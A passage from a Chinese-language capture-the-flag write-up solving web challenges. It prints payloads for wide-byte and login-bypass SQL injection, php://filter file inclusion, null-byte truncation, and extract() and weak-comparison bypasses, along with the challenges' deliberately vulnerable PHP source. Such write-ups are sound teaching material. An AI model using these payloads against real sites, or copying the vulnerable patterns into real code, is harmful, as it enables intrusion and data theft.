[&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure><p>经过查询这种编码方式解码后是一串js代码，并且可以不用解码直接丢入浏览器的控制台就可以执行，那么我们就直接丢入控制台执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行后提示变量ωﾟﾉ未被定义，我们定义变量ωﾟﾉ为空，然后再次输入代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹出flag</p><h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>网址：<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/</a></p><p>页面源代码看到链接</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是点击链接自动跳转到no_key_is_here_forever.php</p><p>说明有重定向，果断burp抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><p>网址：<a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web22/</a></p><p>貌似从谷歌页面访问该页面才能拿到flag</p><p>用burp抓包修改Referer字段值为<a href="https://www.google.com即可拿到flag" target="_blank" rel="noopener">https://www.google.com即可拿到flag</a></p><h3 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h3><p>给出了源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"></span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">eval</span>(CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个加密的程序，直接执行就可以</p><p>结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>网址：<a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看到file参数，很明显的文件包含，直接用php://filter协议读出index.php源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解密后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>看到flag</p><h3 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h3><p>网址：<a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web9/</a></p><p>还是重定向，抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag藏在响应头部</p><h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h3><p>网址：<a href="http://chinalover.sinaapp.com/web10/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web10/index.php</a></p><p>提示login first，burp抓包修改cookie中的login=1</p><p>拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>网址：<a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/</a></p><p>页面提示robots.txt</p><p>那我们就访问<a href="http://chinalover.sinaapp.com/web11/robots.txt" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/robots.txt</a></p><p>发现提示了源代码和sql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现intval函数，作用是将字符串中的整数值取出，并且取出的字符串开始部分的整数值，如intval(1024a1)=1024</p><p>intval(a1)=0</p><p>并且有了intval函数，我们就没办法对参数id进行sql注入</p><p>并且服务器对GET的参数id进行过滤，经过php弱类型比较，如果等于1024，则退出程序</p><p>猜测flag就在id为1024里，所以我们思路是让GET的参数id经过intval函数处理的值为1024，但是弱类型比较不等于1024</p><p>我们知道php弱类型比较两个值是先将这两个值转化为同一类型，这里是字符串与整形的弱类型，就将字符串转化为整形，也是将字符串的整数值部分取出，与intval函数类似，除了处理”e”,”.”,”E”</p><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id = intval(<span class="string">"1024e1"</span>) <span class="comment">//$id=1024</span></span><br><span class="line"><span class="string">"1024e1"</span> == <span class="number">1024</span> <span class="comment">//false</span></span><br><span class="line"><span class="string">"1024e1"</span> == <span class="number">10240</span> <span class="comment">//true</span></span><br><span class="line">$id = intval(<span class="string">"1024.1"</span>) <span class="comment">//$id=1024</span></span><br><span class="line"><span class="string">"1024.1"</span> == <span class="number">1024</span> <span class="comment">//false</span></span><br><span class="line"><span class="string">"1024.1"</span> == <span class="number">1024.1</span> <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么就很明显，我们可以GET参数id=1024e1或者1024.1，都能拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h3><p>网址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p><p>页面显示了执行的sql语句和返回的信息，很明显的注入点在id，数字型注入且从sql语句看id被单引号包裹</p><p>输入id=1’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现单引号被转义了，猜测是宽字节注入，输入id=1%df%27%23，正确返回信息，就可以开始注入了</p><p>sql语句就提示了news表，先看一下news表下的列名</p><p>输入id=0%df’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6e657773 %23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为id和title</p><p>输入id=0%df%27%20union%20select%201,group_concat(title)%20from%20news%23</p><p>注出title信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有发现flag</p><p>那再看看其他表</p><p>输入id=0%df%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名为ctf,ctf2,ctf3,ctf4,news </p><p>看看ctf表下的列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为user,pw</p><p>看看ctf2表下列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为id,content</p><p>看看ctf3表下列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为id,email,token</p><p>最后ctf4表下列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看到flag列</p><p>看看flag列下信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a></p><p>给出了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到ereg函数就想起了%00(NULL)截断，而且ereg和strpos处理数组都会返回null值，null不全等于False，所以直接输入nctf[]即可获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>或者是输入nctf=1%00%23biubiubiu，这里#要用%23代替</p><p>也可以得到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>网址：<a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php</a></p><p>依然是md5碰撞</p><p>GET参数a=240610708&amp;b=QNKCDZO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>网址：<a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web18/index.php</a></p><p>看到提示代码<a href="http://chinalover.sinaapp.com/web18/source.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web18/source.php</a></p><p>给出了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                       <span class="meta">&lt;?php</span></span><br><span class="line">                       extract($_POST);</span><br><span class="line">                       <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                           &lt;div class="alert alert-success"&gt;</span><br><span class="line">                               &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">                           &lt;/div&gt;</span><br><span class="line">                       <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">                   <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract函数的作用是将数组中的键名作为变量名，键值作为变量值，那么思路就很清晰了，我们post两个参数pass和thepassword_123，给这两个变量赋值相同，就可以拿到flag了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h3><p>网址：<a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web4/xxx.php</a></p><p>提示本地登录才行，利用burp抓包添加X-Forwarded-For:127.0.0.1即可，但这里题目坏了，改了也拿不到flag</p><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html</a></p><p>文件上传题目，因为是html页面，所以先看看源代码</p><p>发现上传到upload.php，而且同时上传了一个隐藏值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;</span><br></pre></td></tr></table></figure><p>访问upload.php，提示我们只能上传jpg,png,gif格式文件</p><p>先试着上传一个png文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示必须上传php格式文件</p><p>再试着上传php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示上传不了，看一下二者共同有的信息是一个数组Array,里面有文件名后缀，推测是先对文件后缀名检测，如果不是jpg,png，则过滤</p><p>试着burp抓包修改文件名为demo.png.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>很明显服务器是最后的后缀名检测，再尝试php5,Php等都不行</p><p>所以只能后缀名是png,jpg的文件才能成功上传，然后我们需要想办法让服务器认为这是一个php文件</p><p>上传png文件后的信息看到了basename，猜测跟目录有关，basename这个函数是将路径中的文件名取出，并且我们之前查看源代码也看到了提交了隐藏的目录信息</p><p>我们先试着修改目录，将/uploads/修改成/uploads/demo.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现文件名也跟随着目录值而改变了，所以我们猜测服务器就是根据basename后的文件名进行检测是不是php文件</p><p>经过查询，basename是可以用十六进制的00截断的</p><p>我们将/uploads/修改成/uploads/demo.php (后面有个空格)</p><p>然后在burp的Hex中将对应的20(空格)修改成00</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到flag</p><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>网址：<a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.php</a></p><p><a href="http://chinalover.sinaapp.com/index.phps给出了源代码" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.phps给出了源代码</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">Secure Web Login</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=&quot;Username&quot;&gt;</span><br><span class="line">&lt;input type=password name=pass value=&quot;Password&quot;&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>从源代码看出用户名为admin,且密码是正确的密码才能返回flag</p><p>但是对我们POST的参数user毫无过滤，我们只需要POST参数user=admin’)#即可获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h3><p>网址：<a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a></p><p>给出了源代码提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=@$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span 